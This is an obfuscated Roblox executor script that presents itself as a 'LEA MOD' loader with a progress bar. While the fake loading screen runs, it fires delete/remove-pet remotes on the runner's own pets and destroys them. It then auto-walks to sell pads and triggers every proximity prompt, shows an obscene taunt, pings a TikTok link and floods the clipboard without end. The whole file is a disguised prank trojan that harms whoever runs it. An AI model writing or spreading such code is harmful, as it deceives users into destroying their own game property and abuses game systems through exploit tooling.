local a=game:GetService
local b=a"Players"
local c=a"RunService"
local d=a"TweenService"
local e=a"ReplicatedStorage"
local f=a"UserInputService"
local g=a"PathfindingService"
local h=b.LocalPlayer
local i=h.Character or h.CharacterAdded:Wait()
local j=i:WaitForChild"Humanoid"
local k=i:WaitForChild"HumanoidRootPart"
local l=a"CoreGui"
if l:FindFirstChild"X"then l.X:Destroy()end
local m=Instance.new"ScreenGui"
m.Name="X"
m.IgnoreGuiInset=true
m.ResetOnSpawn=false
m.ZIndexBehavior=Enum.ZIndexBehavior.Global
if syn and syn.protect_gui then
syn.protect_gui(m)
m.Parent=l
elseif gethui then
m.Parent=gethui()
else
m.Parent=l
end
local n=Instance.new"Frame"
n.Name="Y"
n.Size=UDim2.new(1,0,1,0)
n.BackgroundColor3=Color3.fromRGB(0,0,0)
n.BorderSizePixel=0
n.ZIndex=999
n.Parent=m
local o=Instance.new"Frame"
o.Name="Z"
o.Size=UDim2.new(0,420,0,160)
o.Position=UDim2.new(0.5,-210,0.5,-80)
o.BackgroundColor3=Color3.fromRGB(15,15,22)
o.BorderSizePixel=0
o.ZIndex=1000
o.Parent=m
local p=Instance.new"UICorner"
p.CornerRadius=UDim.new(0,10)
p.Parent=o
local q=Instance.new"UIStroke"
q.Color=Color3.fromRGB(0,255,204)
q.Thickness=1.5
q.ZIndex=1000
q.Parent=o
local r=Instance.new"TextLabel"
r.Size=UDim2.new(1,0,0,40)
r.BackgroundTransparency=1
r.Font=Enum.Font.GothamBold
r.Text="LEA MOD"
r.TextColor3=Color3.fromRGB(0,255,204)
r.TextSize=20
r.ZIndex=1000
r.Parent=o
local s=Instance.new"Frame"
s.Size=UDim2.new(0.85,0,0,18)
s.Position=UDim2.new(0.075,0,0.55,0)
s.BackgroundColor3=Color3.fromRGB(25,25,35)
s.BorderSizePixel=0
s.ZIndex=1000
s.Parent=o
local t=Instance.new"UICorner"
t.CornerRadius=UDim.new(1,0)
t.Parent=s
local u=Instance.new"Frame"
u.Size=UDim2.new(0,0,1,0)
u.BackgroundColor3=Color3.fromRGB(0,255,204)
u.BorderSizePixel=0
u.ZIndex=1000
u.Parent=s
local v=Instance.new"UICorner"
v.CornerRadius=UDim.new(1,0)
v.Parent=u
local w=Instance.new"TextLabel"
w.Size=UDim2.new(1,0,0,25)
w.Position=UDim2.new(0,0,0.78,0)
w.BackgroundTransparency=1
w.Font=Enum.Font.Gotham
w.Text="Script loading..."
w.TextColor3=Color3.fromRGB(180,180,200)
w.TextSize=13
w.ZIndex=1000
w.Parent=o
local function x()
local y={"RemovePet","DeletePet","DespawnPet","RemoveCompanion","PetSystem","DeleteBlock","RemoveBlock"}
for _,z in ipairs(y)do
local A=e:FindFirstChild(z,true)
if A and(A:IsA"RemoteEvent"or A:IsA"RemoteFunction")then
return A
end
end
for _,B in ipairs(e:GetDescendants())do
if(B:IsA"RemoteEvent"or B:IsA"RemoteFunction")then
local C=string.lower(B.Name)
if string.find(C,"pet")or string.find(C,"remove")or string.find(C,"delete")then
return B
end
end
end
return nil
end
local D=false
local function E()
local F=x()
local G={"pet","brainrot","companion","animal","follower","minion"}
local function H(I)
local J=string.lower(I)
for _,K in ipairs(G)do
if string.find(J,K,1,true)then
return true
end
end
return false
end
local L={workspace,h:FindFirstChild"Backpack",h.Character,l}
for _,M in ipairs(L)do
if M then
for _,N in ipairs(M:GetDescendants())do
pcall(function()
if N:IsA"Model"or N:IsA"BasePart"then
local O=N:IsA"Model"and N or N:FindFirstAncestorOfClass"Model"
if O and H(O.Name)then
if F then
if F:IsA"RemoteEvent"then
F:FireServer(O)
elseif F:IsA"RemoteFunction"then
F:InvokeServer(O)
end
end
O:Destroy()
end
end
end)
end
end
end
end
local function P()
local Q=nil
local R=math.huge
if not k then return nil end
for _,S in ipairs(workspace:GetDescendants())do
if S:IsA"BasePart"and(S.Name:lower():find"pad"or S.Name:lower():find"sell"or S.Name:lower():find"stand"or S.Name:lower():find"base")then
local T=(k.Position-S.Position).Magnitude
if T<R and T<30 then
R=T
Q=S
end
end
end
return Q
end
local function U()
local V=false
for _,W in ipairs(workspace:GetDescendants())do
if W:IsA"ProximityPrompt"then
local X=string.lower(W.ActionText or"")
local Y=string.lower(W.Name or"")
if X:find("sat")or X:find("sell")or Y:find("sat")or Y:find("sell")then
pcall(function()
for Z=1,5 do
fireproximityprompt(W)
task.wait()
end
end)
V=true
end
elseif W:IsA"ClickDetector"then
pcall(function()
for aa=1,5 do
fireclickdetector(W)
task.wait()
end
end)
V=true
end
end
return V
end
task.spawn(function()
local ab=d:Create(u,TweenInfo.new(4,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Size=UDim2.new(0.999,0,1,0)})
ab:Play()
local ac=tick()
while tick()-ac<4.5 do
E()
task.wait(0.1)
end
u.Size=UDim2.new(0.999,0,1,0)
for ad=1,10 do
E()
task.wait(0.2)
end
D=true
o:Destroy()
local ae=Instance.new"Frame"
ae.Size=UDim2.new(1,0,1,0)
ae.BackgroundColor3=Color3.fromRGB(10,10,15)
ae.BorderSizePixel=0
ae.ZIndex=1000
ae.Parent=m
local af=Instance.new"TextLabel"
af.Size=UDim2.new(1,0,0,100)
af.Position=UDim2.new(0,0,0.4,-50)
af.BackgroundTransparency=1
af.Font=Enum.Font.FredokaOne
af.Text="LEA FUCKED YOUR MOM"
af.TextColor3=Color3.fromRGB(255,0,0)
af.TextSize=38
af.ZIndex=1000
af.Parent=ae
local ag=Instance.new"TextLabel"
ag.Size=UDim2.new(1,0,0,30)
ag.Position=UDim2.new(0,0,0.6,0)
ag.BackgroundTransparency=1
ag.Font=Enum.Font.Code
ag.Text="Jailbreak Lefter4Dead tarafından Modlanmıştır // TİKTOK @LEAPLUS"
ag.TextColor3=Color3.fromRGB(0,255,204)
ag.TextSize=14
ag.ZIndex=1000
ag.Parent=ae
pcall(function()
if request then
request({Url="https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/",Method="GET"})
elseif syn and syn.request then
syn.request({Url="https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/",Method="GET"})
elseif http and http.request then
http.request({Url="https://vt.tiktok.com/ZS9rvKBqBeEQE-9ilFV/",Method="GET"})
end
end)
task.spawn(function()
local ah=0
while true do
ah=(ah+0.01)%1
af.TextColor3=Color3.fromHSV(ah,1,1)
task.wait(0.05)
end
end)
end)
task.spawn(function()
while true do
if D then
E()
pcall(function()
if k and j then
local ai=P()
if ai then
j:MoveTo(ai.Position)
end
end
if not U()then
for _,aj in ipairs(workspace:GetDescendants())do
if aj:IsA"ProximityPrompt"then
for ak=1,5 do
fireproximityprompt(aj)
task.wait()
end
end
end
end
end)
end
task.wait(1)
end
end)
task.spawn(function()
local al=0
while true do
pcall(function()
if setclipboard then
al=al+1
setclipboard("TİKTOK @LEAPLUS "..al)
end
end)
task.wait(0.1)
end
end)
